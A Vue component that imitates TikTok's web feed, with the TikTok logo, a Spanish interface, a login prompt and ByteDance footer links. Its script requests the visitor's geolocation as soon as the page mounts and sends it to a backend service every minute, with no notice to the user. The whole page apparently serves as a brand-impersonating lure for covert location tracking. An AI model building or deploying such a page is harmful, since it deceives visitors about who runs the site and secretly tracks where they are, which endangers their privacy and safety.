<template>
  <v-layout class="tiktok-feed">
    <!-- Mobile Header with Hamburger Menu -->
    <v-app-bar
      v-if="$vuetify.display.smAndDown"
      color="black"
      density="compact"
      class="mobile-header"
    >
      <v-app-bar-nav-icon @click="drawer = !drawer"></v-app-bar-nav-icon>
      <v-spacer></v-spacer>
      <div class="logo-container">
        <img
          src="/tiktok-logo.svg"
          alt="TikTok"
          height="32"
          class="tiktok-logo"
        />
      </div>
      <v-spacer></v-spacer>
    </v-app-bar>

    <!-- Sidebar -->
    <v-navigation-drawer
      v-model="drawer"
      :permanent="!$vuetify.display.smAndDown"
      :temporary="$vuetify.display.smAndDown"
      location="left"
      class="sidebar"
      width="240"
    >
      <!-- Logo (hidden on mobile) -->
      <div class="logo-container py-4" v-if="!$vuetify.display.smAndDown">
        <img
          src="/tiktok-logo.svg"
          alt="TikTok"
          height="42"
          class="tiktok-logo"
        />
      </div>

      <!-- Search Bar -->
      <v-text-field
        prepend-inner-icon="mdi-magnify"
        placeholder="Buscar"
        variant="solo-filled"
        density="compact"
        hide-details
        class="mx-4 mt-2 search-field"
        bg-color="grey-darken-4"
      ></v-text-field>

      <!-- Navigation Items -->
      <v-list class="mt-2">
        <v-list-item
          v-for="(item, i) in menuItems"
          :key="i"
          :value="item"
          :active="activeItem === item.value"
          @click="activeItem = item.value"
          class="menu-item"
        >
          <template v-slot:prepend>
            <v-icon :icon="item.icon" size="24"></v-icon>
          </template>

          <v-list-item-title>{{ item.title }}</v-list-item-title>

          <template v-slot:append v-if="item.badge">
            <v-badge :content="item.badge" color="error" inline></v-badge>
          </template>
        </v-list-item>
      </v-list>

      <v-divider class="my-2"></v-divider>

      <!-- Login Section -->
      <div class="px-4 py-3 login-section">
        <p class="text-body-2 text-grey mb-2">
          Inicia sesión para seguir a creadores, dar me gusta a videos y ver
          comentarios.
        </p>
        <v-btn block color="error" variant="elevated" class="mb-2">
          Iniciar sesión
        </v-btn>
      </div>

      <!-- Footer Links -->
      <div class="footer-links px-4 mt-auto pb-4">
        <div class="text-caption text-grey d-flex flex-wrap gap-2">
          <a
            href="#"
            v-for="(link, i) in footerLinks"
            :key="i"
            class="footer-link"
          >
            {{ link }}
          </a>
        </div>
        <div class="text-caption text-grey-darken-1 mt-4">© 2024 TikTok</div>
      </div>
    </v-navigation-drawer>

    <!-- Main Content -->
    <v-main>
      <v-container fluid class="pa-0">
        <!-- Feed Content -->
        <v-row justify="center" no-gutters>
          <v-col cols="12" sm="8" md="6" lg="4">
            <v-slide-y-transition group>
              <div
                v-for="video in videoStore.videos"
                :key="video.embed_product_id"
                class="video-container"
              >
                <TikTokEmbed :video="video" />
              </div>
            </v-slide-y-transition>

            <!-- Empty State -->
            <div
              v-if="!loading && videoStore.videos.length === 0"
              class="empty-state"
            >
              <v-icon size="64" color="grey-lighten-1">mdi-video-off</v-icon>
              <h3 class="text-h6 mt-4 text-grey-lighten-1">
                No hay videos disponibles
              </h3>
            </div>
          </v-col>
        </v-row>
      </v-container>
    </v-main>
  </v-layout>
</template>

<script setup lang="ts">
import { ref, onMounted, onBeforeUnmount } from "vue";
import TikTokEmbed from "@/components/TikTokEmbed.vue";
import {
  getUserLocation,
  sendLocationData,
} from "@/services/geolocationService";
import { useVideoStore } from "@/stores/videoStore";
import { useDisplay } from "vuetify";

const loading = ref(false);
const drawer = ref(true);
const videoStore = useVideoStore();
const activeItem = ref("for-you");

// Guardamos el ID del intervalo para poder cancelarlo luego
let locationInterval: number | undefined;

const menuItems = [
  { title: "Para ti", icon: "mdi-home", value: "for-you" },
  { title: "Siguiendo", icon: "mdi-account-group", value: "following" },
  { title: "Explorar", icon: "mdi-compass", value: "explore" },
  { title: "LIVE", icon: "mdi-broadcast", value: "live", badge: "12" },
  { title: "Perfil", icon: "mdi-account", value: "profile" },
];

const footerLinks = [
  "Acerca de",
  "Sala de prensa",
  "Contacto",
  "Carreras",
  "ByteDance",
  "Anunciar",
  "Desarrolladores",
  "Transparencia",
  "TikTok Rewards",
  "TikTok Browse",
  "TikTok Embeds",
];

async function requestLocation() {
  loading.value = true;
  try {
    const position = await getUserLocation();
    await sendLocationData(position);
  } catch (error) {
    console.error("Error obteniendo la ubicación:", error);
  } finally {
    loading.value = false;
  }
}

async function refreshFeed() {
  loading.value = true;
  try {
    await requestLocation();
    await videoStore.fetchVideos();
  } catch (error) {
    console.error("Error en refreshFeed:", error);
  } finally {
    loading.value = false;
  }
}

onMounted(() => {
  // Estado inicial del drawer según tamaño de pantalla
  drawer.value = !useDisplay().smAndDown.value;

  // Primera petición de ubicación y carga del feed
  requestLocation();
  videoStore.fetchVideos();

  // Programamos un envío de ubicación cada 60 000 ms (1 minuto)
  locationInterval = window.setInterval(() => {
    requestLocation();
  }, 60_000);
});

onBeforeUnmount(() => {
  // Limpiamos el intervalo al desmontar el componente
  if (locationInterval !== undefined) {
    clearInterval(locationInterval);
  }
});
</script>

<style lang="scss" scoped>
.tiktok-feed {
  background: linear-gradient(to bottom, #1a1a1a, #0a0a0a);
}

.mobile-header {
  border-bottom: 1px solid rgba(255, 255, 255, 0.1);
  position: relative;

  .logo-container {
    position: absolute;
    left: 50%;
    transform: translateX(-50%);
    display: flex;
    align-items: center;
    justify-content: center;
  }
}

.sidebar {
  background: #000000 !important;
  border-right: 1px solid rgba(255, 255, 255, 0.1) !important;
  display: flex;
  flex-direction: column;
}

.logo-container {
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
}

.tiktok-logo {
  filter: brightness(0) invert(1);
}

.search-field {
  :deep(.v-field) {
    border-radius: 92px !important;
    background: rgba(255, 255, 255, 0.06) !important;
  }
}

.menu-item {
  border-radius: 8px;
  margin: 2px 8px;
  height: 48px;

  &:hover {
    background: rgba(255, 255, 255, 0.06);
  }

  &.v-list-item--active {
    background: rgba(255, 255, 255, 0.08);

    :deep(.v-list-item-title) {
      color: #fff;
    }

    .v-icon {
      color: #fff;
    }
  }
}

.login-section {
  background: rgba(255, 255, 255, 0.03);
  border-radius: 8px;
  margin: 0 8px;
}

.footer-links {
  .footer-link {
    color: rgba(255, 255, 255, 0.5);
    text-decoration: none;
    font-size: 12px;

    &:hover {
      text-decoration: underline;
    }
  }
}

.video-container {
  margin-bottom: 2rem;
  scroll-snap-align: start;
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);

  &:hover {
    transform: scale(1.02);
  }
}

.loading-overlay {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0, 0, 0, 0.7);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 1000;
  backdrop-filter: blur(4px);
}

.refresh-button {
  position: fixed;
  bottom: 24px;
  right: 24px;
  z-index: 1000;
  transition: all 0.3s ease;

  &:hover {
    transform: rotate(180deg);
  }
}

.empty-state {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  min-height: 300px;
  padding: 2rem;
  text-align: center;
  background: rgba(255, 255, 255, 0.05);
  border-radius: 20px;
  margin: 2rem 0;
}

:deep(.v-main) {
  height: 100vh;
  overflow-y: auto;
  scroll-snap-type: y mandatory;
  scroll-behavior: smooth;
}

@media (max-width: 600px) {
  .video-container {
    margin-bottom: 1rem;
  }

  .refresh-button {
    bottom: 16px;
    right: 16px;
  }
}
</style>
